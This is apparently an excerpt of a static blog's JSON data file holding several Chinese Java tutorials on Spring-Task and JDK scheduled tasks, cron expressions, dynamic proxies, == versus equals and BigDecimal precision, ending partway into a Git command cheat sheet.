\n&quot;0 15 10 ? * 6#3&quot; 每月的第三个星期五上午10:15触发\n</code></pre><h3 id=\"3-JDK定时时任务的实现：\"><a href=\"#3-JDK定时时任务的实现：\" class=\"headerlink\" title=\"3. JDK定时时任务的实现：\"></a>3. JDK定时时任务的实现：</h3><ul>\n<li>编写TaskUtil.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.common.utils;\n\nimport com.google.common.util.concurrent.ThreadFactoryBuilder;\nimport org.apache.commons.lang3.concurrent.BasicThreadFactory;\nimport java.util.concurrent.*;\n\n/**\n * Description: 基于JDK的定时任务工具类\n *\n * @author Jiankun.Zhangsun 2018/1/11 17:20\n */\npublic class TaskUtils {\n\n    private static ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(&quot;demo-pool-%d&quot;).build();\n\n    public static void schedule(Runnable task, Long delayed, TimeUnit timeUnit) {\n        ScheduledExecutorService scheduleService = Executors.newScheduledThreadPool(5, threadFactory);\n        scheduleService.schedule(task, delayed, timeUnit);\n        scheduleService.shutdown();\n    }\n}\n</code></pre><ul>\n<li>编写StatusTask.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.task;\n\nimport com.bldz.promotion.exceptions.PromotionException;\nimport com.bldz.promotion.service.ActivityService;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n/**\n * Description:\n *\n * @author Jiankun.Zhangsun 2018/1/16 15:43\n */\npublic class StatusTask implements Runnable {\n\n    private Logger logger = LoggerFactory.getLogger(StatusTask.class);\n\n    private ActivityService activityService;\n\n    private String status;\n\n    private String key;\n\n    public StatusTask(String status, String key, ActivityService activityService) {\n        this.status = status;\n        this.key = key;\n        this.activityService = activityService;\n    }\n\n    @Override\n    public void run() {\n        int update;\n        // 新线程中的异常不会在main线程中抛出来\n        try {\n            update = activityService.updateActivityStatus(key, status);\n        } catch (PromotionException e) {\n            logger.error(&quot;update activity status to &quot; + status + &quot; failed!! failed reason:{}&quot;, e) ;\n            return;\n        }\n        if(update &gt; 0) {\n            logger.info(&quot;update activity status to &quot; + status + &quot; successfully!!&quot;);\n        } else {\n            logger.error(&quot;update activity status to &quot; + status + &quot; failed!! update key:{} failed reason:{}&quot;, key, &quot;database error!&quot;) ;\n        }\n    }\n}\n</code></pre><h3 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4. 总结\"></a>4. 总结</h3><p>Spring-Task和JDK都是JavaEE开发中常用到的，不需要额外引入，相对轻量级。 两者分别存在以下优缺点：</p>\n<ol>\n<li>@Schedule中所有参数都是常量，不支持变量，必须在容器启动的时候就开始执行；</li>\n<li>JDK中的定时任务，是通过重启一个线程去执行定时任务的，这个线程根据需求随时可以启动，其中的delay参数支持变量的方式；</li>\n<li>JDK中的定时任务如果宕机了，或者服务器重启了会停止执行，所以采用Spring-Task每5分钟执行一次进行保证定时任务的高可用。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-定时任务框架简介：\"><a href=\"#1-定时任务框架简介：\" class=\"headerlink\" title=\"1. 定时任务框架简介：\"></a>1. 定时任务框架简介：</h3><p>当前定时任务的实现方式主要有： 采用Quartz、Spring-Task、JDK、Zookeeper、Reids、Elastic-Job等。本文只介绍Spring-Task和JDK定时任务的使用。 主要是因为对于Java开发来说，这两个定时任务是不需要引入任何外部Jar包的，属于轻量级定时任务框架。当然，该文适合简单的定时任务，对于复杂的定时任务可采用定时任务调度服务器的方式进行实现。本文将以SpringBoot为框架，以动态维护活动开始和结束时间为例，介绍Spring-Task和JDK定时任务的实现。</p>\n<h3 id=\"2-Spring-Task的使用：\"><a href=\"#2-Spring-Task的使用：\" class=\"headerlink\" title=\"2. Spring-Task的使用：\"></a>2. Spring-Task的使用：</h3><ul>\n<li>App.java类中添加如下注解：</li>\n</ul>\n<pre><code>@EnableAsync  \n@SpringBootApplication  \n@ComponentScan  \n@EnableAutoConfiguration  \n@EnableScheduling  \npublic class App extends SpringBootServletInitializer {  \n    public static void main(String[] args) {  \n        SpringApplication.run(App.class, args);  \n    }  \n}  \n</code></pre><ul>\n<li>编写任务类ActivityTask.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.task;  \n\nimport com.bldz.promotion.common.Constants;  \nimport com.bldz.promotion.service.ActivityService;  \nimport org.slf4j.Logger;  \nimport org.slf4j.LoggerFactory;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.scheduling.annotation.Scheduled;  \nimport org.springframework.stereotype.Component;  \n\n/**\n * 更新活动时间  \n *\n * @author ZhangsunJiankun 2018年1月11日18:06:05  \n */\n@Component  \npublic class ActivityTask {  \n\n    private final ActivityService activityService;  \n\n    private static Logger logger = LoggerFactory.getLogger  (ActivityTask.class);  \n\n    @Autowired  \n    public ActivityTask(ActivityService activityService) {  \n        this.activityService = activityService;  \n    }  \n\n    /**\n     * 更新活动开始时间  \n     */\n    @Scheduled(cron = &quot;0 0/5 * * * ?&quot;)  \n    public void updateToHaving() {  \n        this.update(Constants.ACTIVITY_STATUS_HAVING);  \n    }  \n\n    /**\n     * 更新活动时间为已结束  \n     */\n    @Scheduled(cron = &quot;0 0/5 * * * ?&quot;)  \n    public void updateToEnd() {  \n        this.update(Constants.ACTIVITY_STATUS_OVER);  \n    }  \n\n    private void update(String status) {  \n        if(Constants.ACTIVITY_STATUS_HAVING.equals(status)) {  \n            int items = activityService.updateStatusToHaving();  \n            if(items &gt; 0) {  \n                logger.info(&quot;update activity status to having successfully!   Number of updates:{} &quot;, items);  \n            }  \n        } else if(Constants.ACTIVITY_STATUS_OVER.equals(status)){  \n            int items = activityService.updateStatusToEnd();  \n            if(items &gt; 0) {  \n                logger.info(&quot;update activity status to end successfully!   Number of updates:{} &quot;, items);  \n            }  \n        } else {  \n            logger.error(&quot;update status error! status:{}&quot;, status);  \n        }  \n    }  \n}  \n</code></pre><h6 id=\"至此Spring-Task定时任务已经完成，是不是很简单-）-难点主要在于-Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\"><a href=\"#至此Spring-Task定时任务已经完成，是不是很简单-）-难点主要在于-Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\" class=\"headerlink\" title=\"至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。\"></a>至此Spring-Task定时任务已经完成，是不是很简单:） 难点主要在于@Schedule注解的使用，接下来我就说说这个注解中的参数含义，及使用。</h6><pre><code>@Schedule(String corn, Long fixedDelay, Long fixedRate, Long initialDelay, Long zone)\ncorn: 定时任务表达式\nfixedDelay: 以固定的频率，在最后一次调用的完成之后到下一此调用开始之间执行该方法 (以毫秒为单位)。\ninitialDelay: Spring容器启动之后第一次开始执行该Job的推迟时间\nfixedRate: 以固定的频率执行该方法\nzone: 服务器所在的时区\n</code></pre><h6 id=\"corn表达式的使用\"><a href=\"#corn表达式的使用\" class=\"headerlink\" title=\"corn表达式的使用\"></a>corn表达式的使用</h6><pre><code>Cron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域（Spring-Task只支持6个域），每一个域代表一个含义，每一个域可出现的字符如下： \nSeconds:可出现&quot;, - * /&quot;四个字符，有效范围为0-59的整数 \nMinutes:可出现&quot;, - * /&quot;四个字符，有效范围为0-59的整数 \nHours:可出现&quot;, - * /&quot;四个字符，有效范围为0-23的整数 \nDayofMonth:可出现&quot;, - * / ? L W C&quot;八个字符，有效范围为0-31的整数 \nMonth:可出现&quot;, - * /&quot;四个字符，有效范围为1-12的整数或JAN-DEc \nDayofWeek:可出现&quot;, - * / ? L C #&quot;四个字符，有效范围为1-7的整数或SUN-SAT两个范围。1表示星期天，2表示星期一， 依次类推 \nYear:可出现&quot;, - * /&quot;四个字符，有效范围为1970-2099年\n\n每一个域都使用数字，但还可以出现如下特殊字符，它们的含义是： \n(1)*：表示匹配该域的任意值，假如在Minutes域使用*, 即表示每分钟都会触发事件。\n(2)?:只能用在DayofMonth和DayofWeek两个域。它也匹配域的任意值，但实际不会。因为DayofMonth和DayofWeek会相互影响。例如想在每月的20日触发调度，不管20日到底是星期几，则只能使用如下写法： 13 13 15 20 * ?, 其中最后一位只能用？，而不能使用*，如果使用*表示不管星期几都会触发，实际上并不是这样。 \n(3)-:表示范围，例如在Minutes域使用5-20，表示从5分到20分钟每分钟触发一次 \n(4)/：表示起始时间开始触发，然后每隔固定时间触发一次，例如在Minutes域使用5/20,则意味着5分钟触发一次，而25，45等分别触发一次. \n(5),:表示列出枚举值值。例如：在Minutes域使用5,20，则意味着在5和20分每分钟触发一次。 \n(6)L:表示最后，只能出现在DayofWeek和DayofMonth域，如果在DayofWeek域使用5L,意味着在最后的一个星期四触发。 \n(7)W:表示有效工作日(周一到周五),只能出现在DayofMonth域，系统将在离指定日期的最近的有效工作日触发事件。例如：在 DayofMonth使用5W，如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份 \n(8)LW:这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。 \n(9)#:用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在4#2，表示某月的第二个星期三。\n\n举几个例子: \n0 0 2 1 * ? * 表示在每月的1日的凌晨2点调度任务 \n0 15 10 ? * MON-FRI 表示周一到周五每天上午10：15执行作业 \n0 15 10 ? 6L 2002-2006 表示2002-2006年的每个月的最后一个星期五上午10:15执行作\n0 0 10,14,16 * * ? 每天上午10点，下午2点，4点 \n0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 \n0 0 12 ? * WED 表示每个星期三中午12点 \n&quot;0 0 12 * * ?&quot; 每天中午12点触发 \n&quot;0 15 10 ? * *&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ?&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ? *&quot; 每天上午10:15触发 \n&quot;0 15 10 * * ? 2005&quot; 2005年的每天上午10:15触发 \n&quot;0 * 14 * * ?&quot; 在每天下午2点到下午2:59期间的每1分钟触发 \n&quot;0 0/5 14 * * ?&quot; 在每天下午2点到下午2:55期间的每5分钟触发 \n&quot;0 0/5 14,18 * * ?&quot; 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 \n&quot;0 0-5 14 * * ?&quot; 在每天下午2点到下午2:05期间的每1分钟触发 \n&quot;0 10,44 14 ? 3 WED&quot; 每年三月的星期三的下午2:10和2:44触发 \n&quot;0 15 10 ? * MON-FRI&quot; 周一至周五的上午10:15触发 \n&quot;0 15 10 15 * ?&quot; 每月15日上午10:15触发 \n&quot;0 15 10 L * ?&quot; 每月最后一日的上午10:15触发 \n&quot;0 15 10 ? * 6L&quot; 每月的最后一个星期五上午10:15触发 \n&quot;0 15 10 ? * 6L 2002-2005&quot; 2002年至2005年的每月的最后一个星期五上午10:15触发 \n&quot;0 15 10 ? * 6#3&quot; 每月的第三个星期五上午10:15触发\n</code></pre><h3 id=\"3-JDK定时时任务的实现：\"><a href=\"#3-JDK定时时任务的实现：\" class=\"headerlink\" title=\"3. JDK定时时任务的实现：\"></a>3. JDK定时时任务的实现：</h3><ul>\n<li>编写TaskUtil.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.common.utils;\n\nimport com.google.common.util.concurrent.ThreadFactoryBuilder;\nimport org.apache.commons.lang3.concurrent.BasicThreadFactory;\nimport java.util.concurrent.*;\n\n/**\n * Description: 基于JDK的定时任务工具类\n *\n * @author Jiankun.Zhangsun 2018/1/11 17:20\n */\npublic class TaskUtils {\n\n    private static ThreadFactory threadFactory = new ThreadFactoryBuilder().setNameFormat(&quot;demo-pool-%d&quot;).build();\n\n    public static void schedule(Runnable task, Long delayed, TimeUnit timeUnit) {\n        ScheduledExecutorService scheduleService = Executors.newScheduledThreadPool(5, threadFactory);\n        scheduleService.schedule(task, delayed, timeUnit);\n        scheduleService.shutdown();\n    }\n}\n</code></pre><ul>\n<li>编写StatusTask.java</li>\n</ul>\n<pre><code>package com.bldz.promotion.task;\n\nimport com.bldz.promotion.exceptions.PromotionException;\nimport com.bldz.promotion.service.ActivityService;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n/**\n * Description:\n *\n * @author Jiankun.Zhangsun 2018/1/16 15:43\n */\npublic class StatusTask implements Runnable {\n\n    private Logger logger = LoggerFactory.getLogger(StatusTask.class);\n\n    private ActivityService activityService;\n\n    private String status;\n\n    private String key;\n\n    public StatusTask(String status, String key, ActivityService activityService) {\n        this.status = status;\n        this.key = key;\n        this.activityService = activityService;\n    }\n\n    @Override\n    public void run() {\n        int update;\n        // 新线程中的异常不会在main线程中抛出来\n        try {\n            update = activityService.updateActivityStatus(key, status);\n        } catch (PromotionException e) {\n            logger.error(&quot;update activity status to &quot; + status + &quot; failed!! failed reason:{}&quot;, e) ;\n            return;\n        }\n        if(update &gt; 0) {\n            logger.info(&quot;update activity status to &quot; + status + &quot; successfully!!&quot;);\n        } else {\n            logger.error(&quot;update activity status to &quot; + status + &quot; failed!! update key:{} failed reason:{}&quot;, key, &quot;database error!&quot;) ;\n        }\n    }\n}\n</code></pre><h3 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4. 总结\"></a>4. 总结</h3><p>Spring-Task和JDK都是JavaEE开发中常用到的，不需要额外引入，相对轻量级。 两者分别存在以下优缺点：</p>\n<ol>\n<li>@Schedule中所有参数都是常量，不支持变量，必须在容器启动的时候就开始执行；</li>\n<li>JDK中的定时任务，是通过重启一个线程去执行定时任务的，这个线程根据需求随时可以启动，其中的delay参数支持变量的方式；</li>\n<li>JDK中的定时任务如果宕机了，或者服务器重启了会停止执行，所以采用Spring-Task每5分钟执行一次进行保证定时任务的高可用。</li>\n</ol>\n"},{"title":"动态代理的两种实现","date":"2016-03-23T07:12:12.000Z","_content":"\n### JDK实现方式\n\n\tJDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象,代理对象调用invaoke()方法达到动态代理效果\n\n**代理类的编写**\n![](https://i.imgur.com/yRzK8Sb.png)\n**目标对象(被代理对象)实现的接口定义**\n**![](https://i.imgur.com/M4CM4CJ.png)\n目标对象类(被代理类)**\n![](https://i.imgur.com/1oCsxtO.png)\n**动态代理的测试类**\n![](https://i.imgur.com/IfDvV1y.png)\n\n#### 实现原理步骤：\n\n\t1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n\t2.实现invoke方法AOP思想\n\t3.获取proxy代理对象,proxy.newProxyInstance()\n\n\n### CGLIB实现方式\n\tCglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理\n![](https://i.imgur.com/XLuVFHc.png)\n#### 实现基本步骤:\n\n\t1.在内存中产生一个类Class\n\t2.设置其父类为被代理的类\n\t3.采用回调方法进行回调\n","source":"_posts/动态代理的两种实现.md","raw":"---\ntitle: 动态代理的两种实现\ndate: 2016-3-23 15:12:12\ntags: JavaSE\n---\n\n### JDK实现方式\n\n\tJDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象,代理对象调用invaoke()方法达到动态代理效果\n\n**代理类的编写**\n![](https://i.imgur.com/yRzK8Sb.png)\n**目标对象(被代理对象)实现的接口定义**\n**![](https://i.imgur.com/M4CM4CJ.png)\n目标对象类(被代理类)**\n![](https://i.imgur.com/1oCsxtO.png)\n**动态代理的测试类**\n![](https://i.imgur.com/IfDvV1y.png)\n\n#### 实现原理步骤：\n\n\t1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n\t2.实现invoke方法AOP思想\n\t3.获取proxy代理对象,proxy.newProxyInstance()\n\n\n### CGLIB实现方式\n\tCglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理\n![](https://i.imgur.com/XLuVFHc.png)\n#### 实现基本步骤:\n\n\t1.在内存中产生一个类Class\n\t2.设置其父类为被代理的类\n\t3.采用回调方法进行回调\n","slug":"动态代理的两种实现","published":1,"updated":"2017-12-29T15:25:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tww002ymfahsiwpp3uk","content":"<h3 id=\"JDK实现方式\"><a href=\"#JDK实现方式\" class=\"headerlink\" title=\"JDK实现方式\"></a>JDK实现方式</h3><pre><code>JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象,代理对象调用invaoke()方法达到动态代理效果\n</code></pre><p><strong>代理类的编写</strong><br><img src=\"https://i.imgur.com/yRzK8Sb.png\" alt=\"\"><br><strong>目标对象(被代理对象)实现的接口定义</strong><br><strong><img src=\"https://i.imgur.com/M4CM4CJ.png\" alt=\"\"><br>目标对象类(被代理类)</strong><br><img src=\"https://i.imgur.com/1oCsxtO.png\" alt=\"\"><br><strong>动态代理的测试类</strong><br><img src=\"https://i.imgur.com/IfDvV1y.png\" alt=\"\"></p>\n<h4 id=\"实现原理步骤：\"><a href=\"#实现原理步骤：\" class=\"headerlink\" title=\"实现原理步骤：\"></a>实现原理步骤：</h4><pre><code>1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n2.实现invoke方法AOP思想\n3.获取proxy代理对象,proxy.newProxyInstance()\n</code></pre><h3 id=\"CGLIB实现方式\"><a href=\"#CGLIB实现方式\" class=\"headerlink\" title=\"CGLIB实现方式\"></a>CGLIB实现方式</h3><pre><code>Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理\n</code></pre><p><img src=\"https://i.imgur.com/XLuVFHc.png\" alt=\"\"></p>\n<h4 id=\"实现基本步骤\"><a href=\"#实现基本步骤\" class=\"headerlink\" title=\"实现基本步骤:\"></a>实现基本步骤:</h4><pre><code>1.在内存中产生一个类Class\n2.设置其父类为被代理的类\n3.采用回调方法进行回调\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"JDK实现方式\"><a href=\"#JDK实现方式\" class=\"headerlink\" title=\"JDK实现方式\"></a>JDK实现方式</h3><pre><code>JDK动态代理是对对象做代理,需要获取到被代理的对象,同时要求被代理对象的类要实现接口然后通过proxy.newProxyInstance()创建代理对象,代理对象调用invaoke()方法达到动态代理效果\n</code></pre><p><strong>代理类的编写</strong><br><img src=\"https://i.imgur.com/yRzK8Sb.png\" alt=\"\"><br><strong>目标对象(被代理对象)实现的接口定义</strong><br><strong><img src=\"https://i.imgur.com/M4CM4CJ.png\" alt=\"\"><br>目标对象类(被代理类)</strong><br><img src=\"https://i.imgur.com/1oCsxtO.png\" alt=\"\"><br><strong>动态代理的测试类</strong><br><img src=\"https://i.imgur.com/IfDvV1y.png\" alt=\"\"></p>\n<h4 id=\"实现原理步骤：\"><a href=\"#实现原理步骤：\" class=\"headerlink\" title=\"实现原理步骤：\"></a>实现原理步骤：</h4><pre><code>1.自定义MyinvacationHandler实现InvacationHandler接口,构造方法接收被代理对象\n2.实现invoke方法AOP思想\n3.获取proxy代理对象,proxy.newProxyInstance()\n</code></pre><h3 id=\"CGLIB实现方式\"><a href=\"#CGLIB实现方式\" class=\"headerlink\" title=\"CGLIB实现方式\"></a>CGLIB实现方式</h3><pre><code>Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理\n</code></pre><p><img src=\"https://i.imgur.com/XLuVFHc.png\" alt=\"\"></p>\n<h4 id=\"实现基本步骤\"><a href=\"#实现基本步骤\" class=\"headerlink\" title=\"实现基本步骤:\"></a>实现基本步骤:</h4><pre><code>1.在内存中产生一个类Class\n2.设置其父类为被代理的类\n3.采用回调方法进行回调\n</code></pre>"},{"title":"==和equals的区别","date":"2014-08-04T02:52:54.000Z","_content":"\n==和equals的区别:\n\n\t1. ==对于基本数据类型来说比较的是值,引用数据类型来说比较的是地址值\n\t2. equals只能比较引用数据类型,不能比较基本数据类型\n\t3. Object中的==和equals是一样的,都比较的是地址值,我们需要重写equas方法\n\n","source":"_posts/和equals的区别.md","raw":"---\ntitle: ==和equals的区别\ndate: 2014-8-4 10:52:54\ntags: JavaSE\n---\n\n==和equals的区别:\n\n\t1. ==对于基本数据类型来说比较的是值,引用数据类型来说比较的是地址值\n\t2. equals只能比较引用数据类型,不能比较基本数据类型\n\t3. Object中的==和equals是一样的,都比较的是地址值,我们需要重写equas方法\n\n","slug":"和equals的区别","published":1,"updated":"2017-12-29T13:33:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twx0030mfahol0xsrs6","content":"<p>==和equals的区别:</p>\n<pre><code>1. ==对于基本数据类型来说比较的是值,引用数据类型来说比较的是地址值\n2. equals只能比较引用数据类型,不能比较基本数据类型\n3. Object中的==和equals是一样的,都比较的是地址值,我们需要重写equas方法\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>==和equals的区别:</p>\n<pre><code>1. ==对于基本数据类型来说比较的是值,引用数据类型来说比较的是地址值\n2. equals只能比较引用数据类型,不能比较基本数据类型\n3. Object中的==和equals是一样的,都比较的是地址值,我们需要重写equas方法\n</code></pre>"},{"title":"大数据类型BigDecimal与Double","date":"2014-12-13T08:08:25.000Z","type":"tags","_content":"#### 大数据类型BigDecimal与Double\n\n我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\n\n**BigDecimal与Double的实验**\n\n分别采用两种方式计算两个小数的加法运算:\n\n\tpublic static void testNaN() {\n\t    int num1 = 10;\n\t    float num2 = 10.1F;\n\t    double num3 = 10.2;\n\n\t    BigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n\t    BigDecimal add2 = new BigDecimal(\"10.1\").add(new BigDecimal(\"10.2\"));\n\t    BigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n\t    Double add4 = num3 + num2;\n\t    System.out.println(add1 + \"****\" + add2 + \"****\" + add3 + \"****\" + add4);\n\t}\n**执行结果:**\n\n20.3****20.3****20.300000381469727****20.300000381469726\n**得出结论:**\n\n浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n\n**使用心得:**\n\n我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n\n**API的使用:**\n\nadd(other) — 和 \nsubtract(other) — 差 \nmultiply(other) — 积 \ndivid(other) — 商 \nmod(oher) — 余 \nint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数 \nvalueOf(other) — 将基数值转换为大数据类型\n\n","source":"_posts/大数据类型BigDecimal与Double.md","raw":"---\ntitle: 大数据类型BigDecimal与Double\ndate: 2014-12-13 16:08:25\ntags: JavaSE\ntype: \"tags\"\n---\n#### 大数据类型BigDecimal与Double\n\n我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\n\n**BigDecimal与Double的实验**\n\n分别采用两种方式计算两个小数的加法运算:\n\n\tpublic static void testNaN() {\n\t    int num1 = 10;\n\t    float num2 = 10.1F;\n\t    double num3 = 10.2;\n\n\t    BigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n\t    BigDecimal add2 = new BigDecimal(\"10.1\").add(new BigDecimal(\"10.2\"));\n\t    BigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n\t    Double add4 = num3 + num2;\n\t    System.out.println(add1 + \"****\" + add2 + \"****\" + add3 + \"****\" + add4);\n\t}\n**执行结果:**\n\n20.3****20.3****20.300000381469727****20.300000381469726\n**得出结论:**\n\n浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n\n**使用心得:**\n\n我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n\n**API的使用:**\n\nadd(other) — 和 \nsubtract(other) — 差 \nmultiply(other) — 积 \ndivid(other) — 商 \nmod(oher) — 余 \nint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数 \nvalueOf(other) — 将基数值转换为大数据类型\n\n","slug":"大数据类型BigDecimal与Double","published":1,"updated":"2018-11-24T14:22:22.195Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twz0032mfahd28448f9","content":"<h4 id=\"大数据类型BigDecimal与Double\"><a href=\"#大数据类型BigDecimal与Double\" class=\"headerlink\" title=\"大数据类型BigDecimal与Double\"></a>大数据类型BigDecimal与Double</h4><p>我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.</p>\n<p><strong>BigDecimal与Double的实验</strong></p>\n<p>分别采用两种方式计算两个小数的加法运算:</p>\n<pre><code>public static void testNaN() {\n    int num1 = 10;\n    float num2 = 10.1F;\n    double num3 = 10.2;\n\n    BigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n    BigDecimal add2 = new BigDecimal(&quot;10.1&quot;).add(new BigDecimal(&quot;10.2&quot;));\n    BigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n    Double add4 = num3 + num2;\n    System.out.println(add1 + &quot;****&quot; + add2 + &quot;****&quot; + add3 + &quot;****&quot; + add4);\n}\n</code></pre><p><strong>执行结果:</strong></p>\n<p>20.3<strong><strong>20.3</strong></strong>20.300000381469727<strong>**20.300000381469726\n</strong>得出结论:**</p>\n<p>浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性</p>\n<p><strong>使用心得:</strong></p>\n<p>我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算</p>\n<p><strong>API的使用:</strong></p>\n<p>add(other) — 和<br>subtract(other) — 差<br>multiply(other) — 积<br>divid(other) — 商<br>mod(oher) — 余<br>int compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数<br>valueOf(other) — 将基数值转换为大数据类型</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"大数据类型BigDecimal与Double\"><a href=\"#大数据类型BigDecimal与Double\" class=\"headerlink\" title=\"大数据类型BigDecimal与Double\"></a>大数据类型BigDecimal与Double</h4><p>我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.</p>\n<p><strong>BigDecimal与Double的实验</strong></p>\n<p>分别采用两种方式计算两个小数的加法运算:</p>\n<pre><code>public static void testNaN() {\n    int num1 = 10;\n    float num2 = 10.1F;\n    double num3 = 10.2;\n\n    BigDecimal add1 = BigDecimal.valueOf(10.1).add(BigDecimal.valueOf(10.2));\n    BigDecimal add2 = new BigDecimal(&quot;10.1&quot;).add(new BigDecimal(&quot;10.2&quot;));\n    BigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));\n    Double add4 = num3 + num2;\n    System.out.println(add1 + &quot;****&quot; + add2 + &quot;****&quot; + add3 + &quot;****&quot; + add4);\n}\n</code></pre><p><strong>执行结果:</strong></p>\n<p>20.3<strong><strong>20.3</strong></strong>20.300000381469727<strong>**20.300000381469726\n</strong>得出结论:**</p>\n<p>浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性</p>\n<p><strong>使用心得:</strong></p>\n<p>我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算</p>\n<p><strong>API的使用:</strong></p>\n<p>add(other) — 和<br>subtract(other) — 差<br>multiply(other) — 积<br>divid(other) — 商<br>mod(oher) — 余<br>int compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数<br>valueOf(other) — 将基数值转换为大数据类型</p>\n"},{"title":"支付宝支付功能","date":"2018-01-31T08:32:39.000Z","_content":"![JavaEE](支付宝支付功能/1.png)","source":"_posts/支付宝支付功能.md","raw":"---\ntitle: 支付宝支付功能\ndate: 2018-01-31 16:32:39\ntags: JavaEE\n---\n![JavaEE](支付宝支付功能/1.png)","slug":"支付宝支付功能","published":1,"updated":"2018-01-31T08:34:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx00035mfaho61clva9","content":"<p><img src=\"支付宝支付功能/1.png\" alt=\"JavaEE\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"支付宝支付功能/1.png\" alt=\"JavaEE\"></p>\n"},{"layout":"git","title":"Git常用命令速查表","date":"2016-07-30T05:41:35.000Z","_content":"### Git 常用命令速查 ###\n\n|命令|简要说明|\n|---|---|\n|gitadd|添加至暂存区|\n|git add–interactive|交互式添加|\n|git apply|应用补丁|\n|git am|应用邮件格式补丁|\n|git annotate|同义词，等同于 git blame|\n|git archive|文件归档打包|\n|git bisect|二分查找|\n|git blame|文件逐行追溯|\n|git branch|查看本地分支|\n|git cat-file|版本库对象研究工具|\n|git checkout|检出到工作区、切换或创建分支|\n|git cherry-pick|提交拣选|\n|git citool|图形化提交，相当于 git gui 命令|\n|git clean|清除工作区未跟踪文件|\n|git 